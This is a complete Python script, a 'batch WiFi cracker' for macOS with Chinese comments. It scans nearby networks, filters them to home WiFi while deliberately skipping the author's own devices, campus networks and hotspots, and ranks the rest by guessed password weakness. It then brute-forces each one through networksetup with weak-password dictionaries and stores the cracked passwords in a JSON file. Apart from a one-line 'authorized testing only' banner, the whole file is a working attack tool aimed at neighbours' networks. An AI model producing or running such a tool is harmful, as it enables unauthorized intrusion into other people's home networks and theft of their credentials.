#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
批量WiFi破解器 v1.0
核心功能：
  1. 自动扫描周围所有家庭WiFi
  2. 按信号强度+密码难度排序，逐个攻击
  3. 每个目标使用快速字典尝试（可配置轮次深度）
  4. 所有破解成功的密码统一保存到 cracked.json
  5. 支持断点续传、跳过已破解目标、MAC轮换

注意：macOS 仅有一个WiFi网卡(en0)，硬件层面无法同时连接多个AP
      因此采用"批量串行"策略：逐个目标快速尝试高频密码

适配：macOS Apple Silicon
"""

import argparse
import json
import signal
import subprocess
import sys
import time
from pathlib import Path

SCRIPT_DIR = Path(__file__).resolve().parent
PROJECT_DIR = SCRIPT_DIR.parent
WORDLISTS_DIR = PROJECT_DIR / "wordlists"
ONLINE_DIR = WORDLISTS_DIR / "online"
CAPTURES_DIR = PROJECT_DIR / "captures"
CRACKED_FILE = CAPTURES_DIR / "cracked.json"
BATCH_PROGRESS_FILE = CAPTURES_DIR / "batch_progress.json"

# ============================================================
# 颜色常量
# ============================================================
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
RESET = "\033[0m"
BOLD = "\033[1m"


# ============================================================
# 工具函数
# ============================================================
def load_cracked():
    """加载已破解记录"""
    if CRACKED_FILE.exists():
        try:
            with open(CRACKED_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}


def save_cracked(ssid, password):
    """保存破解结果"""
    CAPTURES_DIR.mkdir(parents=True, exist_ok=True)
    data = load_cracked()
    data[ssid] = {
        "password": password,
        "time": time.strftime("%Y-%m-%d %H:%M:%S"),
        "source": "batch_crack",
    }
    with open(CRACKED_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)


def load_batch_progress():
    """加载批量破解进度"""
    if BATCH_PROGRESS_FILE.exists():
        try:
            with open(BATCH_PROGRESS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}


def save_batch_progress(progress):
    """保存批量破解进度"""
    CAPTURES_DIR.mkdir(parents=True, exist_ok=True)
    with open(BATCH_PROGRESS_FILE, "w", encoding="utf-8") as f:
        json.dump(progress, f, ensure_ascii=False, indent=2)


# ============================================================
# WiFi扫描（直接调用wifi_scanner模块 + 已保存列表回退）
# ============================================================
def get_saved_wifi_list(interface="en0"):
    """
    获取Mac已保存的WiFi列表（不受位置权限限制）
    返回: [ssid1, ssid2, ...]
    """
    try:
        r = subprocess.run(
            ["networksetup", "-listpreferredwirelessnetworks", interface],
            capture_output=True, text=True, timeout=10
        )
        lines = r.stdout.strip().split("\n")
        # 第一行是标题 "Preferred networks on en0:"，后续每行是一个SSID（有缩进）
        ssids = []
        for line in lines[1:]:
            ssid = line.strip()
            if ssid:
                ssids.append(ssid)
        return ssids
    except Exception:
        return []


def scan_wifi_targets():
    """
    扫描周围WiFi并返回家庭WiFi列表
    策略：
      1. 先用CoreWLAN扫描（可获取SSID/信号/安全类型等详细信息）
      2. 若SSID全为空（位置权限受限），回退到Mac已保存WiFi列表
    返回: [dict, ...]
    """
    print(f"{CYAN}[*] 正在扫描周围WiFi...{RESET}")

    # 导入扫描器模块
    sys.path.insert(0, str(SCRIPT_DIR))
    try:
        from wifi_scanner import scan, estimate_password_strength
        _has_scanner = True
    except ImportError:
        _has_scanner = False

        # 简单回退：仅做品牌识别
        def estimate_password_strength(ssid, security=""):
            return {"brand": "未知", "difficulty": "中", "strategy": "通用字典",
                    "estimated_time": "", "notes": ""}

    # 尝试CoreWLAN扫描
    targets = []
    cracked = load_cracked()
    has_ssid = False

    if _has_scanner:
        nets, cur = scan()
        if nets:
            for n in nets:
                ssid = n.get("ssid", "")
                if ssid:
                    has_ssid = True
                    net_type = n.get("type", "unknown")
                    if net_type not in ("home", "unknown"):
                        continue
                    if ssid in cracked:
                        continue
                    security = n.get("security", "")
                    strength = estimate_password_strength(ssid, security)
                    if strength["difficulty"] in ("无", "极高"):
                        continue
                    targets.append({
                        "ssid": ssid,
                        "rssi": n.get("rssi", -100),
                        "channel": n.get("channel", 0),
                        "band": n.get("band", ""),
                        "security": security,
                        "brand": strength["brand"],
                        "difficulty": strength["difficulty"],
                        "strategy": strength["strategy"],
                    })

    # 回退：SSID全为空时，从Mac已保存WiFi列表获取目标
    if not has_ssid or not targets:
        print(f"{YELLOW}[*] SSID被隐藏（macOS位置权限限制），回退到已保存WiFi列表{RESET}")
        saved = get_saved_wifi_list()
        if not saved:
            print(f"{RED}[!] 无法获取已保存WiFi列表{RESET}")
            return []

        print(f"    已保存WiFi: {len(saved)} 个")

        # 过滤非攻击目标关键词
        skip_keywords = [
            # 校园网
            "eduroam", "cmcc-edu", "ixaut", "snut",
            # 运营商公共WiFi
            "chinanet-", "chinaunicom",
            # 手机热点（不是路由器WiFi）
            "iphone", "xiaomi", "huawei", "oppo", "vivo", "redmi",
            "iqoo", "oneplus", "realme", "samsung", "mi ",
            # 酒店/商户（非家庭WiFi）
            "hotel", "酒店", "passengers",
            # 用户自己的设备（根据已保存列表中的特征过滤）
            "传康", "crazyk", "@crazyk", "crazy14", "crazy//",
        ]

        for ssid in saved:
            if ssid in cracked:
                continue

            # 跳过明显的手机热点和校园网（简单过滤）
            ssid_lower = ssid.lower()
            is_skip = False
            for kw in skip_keywords:
                if kw in ssid_lower:
                    is_skip = True
                    break
            if is_skip:
                continue

            strength = estimate_password_strength(ssid)
            if strength["difficulty"] in ("无", "极高"):
                continue

            targets.append({
                "ssid": ssid,
                "rssi": -60,  # 默认信号强度（已保存WiFi无法获取实时信号）
                "channel": 0,
                "band": "",
                "security": "WPA2",  # 默认假设WPA2
                "brand": strength["brand"],
                "difficulty": strength["difficulty"],
                "strategy": strength["strategy"],
            })

    # 排序：低难度优先，同难度按信号强度排序
    difficulty_order = {"低": 0, "中": 1, "高": 2}
    targets.sort(key=lambda x: (difficulty_order.get(x["difficulty"], 9), -x["rssi"]))

    return targets


# ============================================================
# 构建字典列表（按优先级）
# ============================================================
def get_wordlists(depth="quick"):
    """
    根据深度获取字典列表

    参数:
        depth: "quick"=仅高频 / "medium"=中等 / "full"=完整
    返回:
        [(字典名, 字典路径), ...]
    """
    wordlists = []

    # 快速高频字典
    wk = ONLINE_DIR / "chinese_weak1000.txt"
    if wk.exists():
        wordlists.append(("中国弱密码Top1000", str(wk)))

    ct10k = ONLINE_DIR / "chinese_top10000.txt"
    if ct10k.exists():
        wordlists.append(("中国常用密码Top10000", str(ct10k)))

    if depth in ("medium", "full"):
        sl = ONLINE_DIR / "seclists_wpa_top4800.txt"
        if sl.exists():
            wordlists.append(("SecLists WPA Top4800", str(sl)))

        ct100k = ONLINE_DIR / "chinese_top100000.txt"
        if ct100k.exists():
            wordlists.append(("中国常用密码Top100000", str(ct100k)))

    if depth == "full":
        final = WORDLISTS_DIR / "wifi_dict_final.txt"
        if final.exists():
            wordlists.append(("完整字典", str(final)))

    return wordlists


# ============================================================
# 单目标破解
# ============================================================
def try_connect(ssid, password, interface="en0"):
    """尝试WiFi连接，返回 (是否成功, 耗时)"""
    t0 = time.time()
    try:
        r = subprocess.run(
            ["networksetup", "-setairportnetwork", interface, ssid, password],
            capture_output=True, text=True, timeout=15
        )
        elapsed = time.time() - t0
        out = r.stdout + r.stderr

        # 明确失败的情况
        if "Could not find" in out or "Error" in out or "Failed" in out:
            return False, elapsed

        # 验证连接
        time.sleep(0.3)
        chk = subprocess.run(
            ["networksetup", "-getairportnetwork", interface],
            capture_output=True, text=True, timeout=5
        )
        return ssid in chk.stdout, elapsed
    except Exception:
        return False, time.time() - t0


def crack_single_target(ssid, wordlists, interface="en0", delay=0.5,
                        max_per_dict=0, interrupted_flag=None):
    """
    对单个目标执行破解

    参数:
        ssid: 目标SSID
        wordlists: [(字典名, 字典路径), ...]
        interface: WiFi接口
        delay: 尝试间隔
        max_per_dict: 每个字典最多尝试条数（0=不限）
        interrupted_flag: 中断标志列表 [bool]
    返回:
        (是否成功, 密码或None, 尝试次数)
    """
    total_tried = 0

    for wl_name, wl_path in wordlists:
        wl_p = Path(wl_path)
        if not wl_p.exists():
            continue

        with open(wl_p, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [l.strip() for l in f if l.strip()]

        if max_per_dict > 0:
            passwords = passwords[:max_per_dict]

        total = len(passwords)
        if total == 0:
            continue

        for idx, pwd in enumerate(passwords):
            # 检查中断
            if interrupted_flag and interrupted_flag[0]:
                return False, None, total_tried

            total_tried += 1
            pct = (idx + 1) / total * 100

            sys.stdout.write(
                f"\r    [{pct:5.1f}%] {idx+1}/{total}  {pwd:<20}"
            )
            sys.stdout.flush()

            ok, elapsed = try_connect(ssid, pwd, interface)

            if ok:
                print()
                return True, pwd, total_tried

            if delay > 0:
                time.sleep(delay)

        print()

    return False, None, total_tried


# ============================================================
# 批量破解主流程
# ============================================================
def batch_crack(targets, wordlists, interface="en0", delay=0.5,
                max_per_dict=0):
    """
    批量串行破解多个WiFi目标

    参数:
        targets: 目标列表
        wordlists: 字典列表
        interface: WiFi接口
        delay: 尝试间隔
        max_per_dict: 每个字典最多尝试条数
    """
    total_targets = len(targets)
    if total_targets == 0:
        print(f"{YELLOW}[!] 没有可攻击的目标{RESET}")
        return

    # 信号处理
    interrupted = [False]
    def on_int(sig, frame):
        interrupted[0] = True
        print()
        print(f"\n{YELLOW}[!] 用户中断，正在保存进度...{RESET}")
    old_handler = signal.signal(signal.SIGINT, on_int)

    # 统计
    success_count = 0
    fail_count = 0
    skip_count = 0
    results = []
    batch_start = time.time()

    # 加载进度
    progress = load_batch_progress()

    print()
    print(f"{BOLD}{'=' * 65}")
    print(f"  批量WiFi破解 - 开始攻击")
    print(f"  目标数: {total_targets}  |  字典数: {len(wordlists)}  |  延迟: {delay}s")
    print(f"{'=' * 65}{RESET}")
    print()

    try:
        for t_idx, target in enumerate(targets):
            if interrupted[0]:
                break

            ssid = target["ssid"]
            brand = target["brand"]
            difficulty = target["difficulty"]

            # 跳过已破解
            cracked = load_cracked()
            if ssid in cracked:
                skip_count += 1
                print(f"  {GREEN}[{t_idx+1}/{total_targets}] {ssid} - 已破解，跳过{RESET}")
                continue

            # 跳过已标记为字典耗尽的目标（批量进度记录）
            if ssid in progress and progress[ssid].get("status") == "exhausted":
                skip_count += 1
                print(f"  {YELLOW}[{t_idx+1}/{total_targets}] {ssid} - 字典已耗尽，跳过{RESET}")
                continue

            # 难度颜色
            diff_color = GREEN if difficulty == "低" else (
                YELLOW if difficulty == "中" else RED)

            print(f"{BOLD}{CYAN}")
            print(f"  ┌────────────────────────────────────────────────────┐")
            print(f"  │  目标 {t_idx+1}/{total_targets}: {ssid:<40}│")
            print(f"  │  品牌: {brand:<10} 难度: {difficulty:<5} "
                  f"信号: {target['rssi']}dBm{' ' * (16 - len(str(target['rssi'])))}│")
            print(f"  └────────────────────────────────────────────────────┘{RESET}")

            t_start = time.time()
            ok, pwd, tried = crack_single_target(
                ssid=ssid,
                wordlists=wordlists,
                interface=interface,
                delay=delay,
                max_per_dict=max_per_dict,
                interrupted_flag=interrupted,
            )
            t_elapsed = time.time() - t_start

            if ok:
                success_count += 1
                save_cracked(ssid, pwd)
                progress[ssid] = {
                    "status": "cracked",
                    "password": pwd,
                    "tried": tried,
                    "time": time.strftime("%Y-%m-%d %H:%M:%S"),
                }
                save_batch_progress(progress)

                print(f"  {GREEN}{BOLD}>>> 破解成功！SSID: {ssid}  密码: {pwd}  "
                      f"(尝试{tried}次, {t_elapsed:.0f}s){RESET}")
                results.append((ssid, "成功", pwd, tried, t_elapsed))
            else:
                fail_count += 1
                progress[ssid] = {
                    "status": "exhausted",
                    "tried": tried,
                    "time": time.strftime("%Y-%m-%d %H:%M:%S"),
                }
                save_batch_progress(progress)

                print(f"  {RED}[X] 未命中 - {ssid} (尝试{tried}次, {t_elapsed:.0f}s){RESET}")
                results.append((ssid, "失败", None, tried, t_elapsed))

            # 目标之间暂停（让WiFi接口恢复）
            if t_idx < total_targets - 1 and not interrupted[0]:
                print(f"  {YELLOW}>>> 切换下一个目标 (2秒)...{RESET}")
                time.sleep(2)
                print()

    finally:
        signal.signal(signal.SIGINT, old_handler)

    # 最终报告
    total_time = time.time() - batch_start
    print()
    print(f"{BOLD}{'=' * 65}")
    print(f"  批量破解完成 - 最终报告")
    print(f"{'=' * 65}{RESET}")
    print()
    print(f"  总目标:   {total_targets}")
    print(f"  {GREEN}破解成功: {success_count}{RESET}")
    print(f"  {RED}未命中:   {fail_count}{RESET}")
    print(f"  {YELLOW}已跳过:   {skip_count}{RESET}")
    print(f"  总耗时:   {total_time:.0f}s ({total_time/60:.1f}分钟)")
    print()

    # 成功列表
    cracked_results = [(s, p) for s, st, p, _, _ in results if st == "成功"]
    if cracked_results:
        print(f"  {GREEN}{BOLD}已破解的WiFi:{RESET}")
        print(f"  {'SSID':<28} {'密码':<24}")
        print(f"  {'-' * 52}")
        for ssid, pwd in cracked_results:
            print(f"  {ssid:<28} {pwd:<24}")
        print()
        print(f"  密码已保存到: {CRACKED_FILE}")
    else:
        print(f"  {YELLOW}本次未破解任何WiFi{RESET}")

    print(f"{'=' * 65}")


# ============================================================
# 入口
# ============================================================
def main():
    parser = argparse.ArgumentParser(description="批量WiFi破解器 v1.0")
    parser.add_argument("-d", "--delay", type=float, default=0.5,
                        help="尝试间隔秒数（默认0.5）")
    parser.add_argument("-i", "--interface", default="en0",
                        help="WiFi接口（默认en0）")
    parser.add_argument("--depth", choices=["quick", "medium", "full"],
                        default="quick",
                        help="攻击深度: quick=仅高频约1万条 / "
                             "medium=含SecLists约5万条 / full=完整字典")
    parser.add_argument("--max-per-dict", type=int, default=0,
                        help="每个字典最多尝试条数（0=不限，推荐5000快速扫一遍）")
    parser.add_argument("--targets", nargs="+",
                        help="手动指定目标SSID列表（不指定则自动扫描）")
    parser.add_argument("--reset", action="store_true",
                        help="清除批量进度记录，重新开始")
    parser.add_argument("--show-cracked", action="store_true",
                        help="显示所有已破解的WiFi")
    args = parser.parse_args()

    print(f"{BOLD}{'=' * 65}")
    print(f"  批量WiFi破解器 v1.0")
    print(f"  自动扫描 → 逐个攻击 → 密码统一保存")
    print(f"  macOS Apple Silicon | 仅限授权网络安全测试")
    print(f"{'=' * 65}{RESET}")

    # 显示已破解记录
    if args.show_cracked:
        cracked = load_cracked()
        if not cracked:
            print(f"\n  {YELLOW}暂无破解记录{RESET}")
        else:
            print(f"\n  {GREEN}{BOLD}已破解的WiFi ({len(cracked)}个):{RESET}")
            print(f"  {'SSID':<28} {'密码':<24} {'时间'}")
            print(f"  {'-' * 70}")
            for ssid, info in cracked.items():
                pwd = info.get("password", "?")
                t = info.get("time", "N/A")
                print(f"  {ssid:<28} {pwd:<24} {t}")
        return

    # 清除进度
    if args.reset:
        if BATCH_PROGRESS_FILE.exists():
            BATCH_PROGRESS_FILE.unlink()
            print(f"  {GREEN}[+] 批量进度已清除{RESET}")
        return

    # 获取目标
    if args.targets:
        # 手动指定目标
        targets = []
        sys.path.insert(0, str(SCRIPT_DIR))
        try:
            from wifi_scanner import estimate_password_strength
        except ImportError:
            estimate_password_strength = lambda s, sec="": {
                "brand": "未知", "difficulty": "中", "strategy": "通用字典"
            }
        for ssid in args.targets:
            strength = estimate_password_strength(ssid)
            targets.append({
                "ssid": ssid,
                "rssi": -50,
                "channel": 0,
                "band": "",
                "security": "WPA2",
                "brand": strength["brand"],
                "difficulty": strength["difficulty"],
                "strategy": strength["strategy"],
            })
    else:
        # 自动扫描
        targets = scan_wifi_targets()

    if not targets:
        print(f"\n  {YELLOW}[!] 没有可攻击的目标（全部已破解或无家庭WiFi）{RESET}")
        return

    # 显示目标列表
    print()
    print(f"  {BOLD}发现 {len(targets)} 个目标:{RESET}")
    print(f"  {'#':>3} {'SSID':<24} {'信号':>5} {'品牌':<8} {'难度':<5} {'推荐策略'}")
    print(f"  {'-' * 70}")
    for i, t in enumerate(targets, 1):
        diff_color = GREEN if t["difficulty"] == "低" else (
            YELLOW if t["difficulty"] == "中" else RED)
        print(f"  {i:>3} {t['ssid']:<24} {t['rssi']:>4}  {t['brand']:<8} "
              f"{diff_color}{t['difficulty']:<5}{RESET} {t['strategy']}")

    # 获取字典
    wordlists = get_wordlists(args.depth)
    if not wordlists:
        print(f"\n  {RED}[!] 无可用字典，请先运行 download_dicts.py{RESET}")
        return

    print()
    print(f"  {BOLD}字典配置 (深度={args.depth}):{RESET}")
    total_lines = 0
    for wl_name, wl_path in wordlists:
        wl_p = Path(wl_path)
        lines = sum(1 for _ in open(wl_p, "r", errors="ignore")) if wl_p.exists() else 0
        if args.max_per_dict > 0:
            lines = min(lines, args.max_per_dict)
        total_lines += lines
        print(f"    {wl_name}: {lines:,} 条")

    est_per_target = total_lines * (args.delay + 0.26) / 60
    est_total = est_per_target * len(targets)
    print()
    print(f"  每个目标预估: ~{est_per_target:.0f} 分钟")
    print(f"  全部预估:     ~{est_total:.0f} 分钟 ({est_total/60:.1f} 小时)")
    print()

    # 确认执行
    try:
        confirm = input(f"  {BOLD}确认开始批量破解? (Y/n): {RESET}").strip().lower()
    except EOFError:
        confirm = "y"
    if confirm == "n":
        print("  已取消")
        return

    # 执行批量破解
    batch_crack(
        targets=targets,
        wordlists=wordlists,
        interface=args.interface,
        delay=args.delay,
        max_per_dict=args.max_per_dict,
    )


if __name__ == "__main__":
    main()
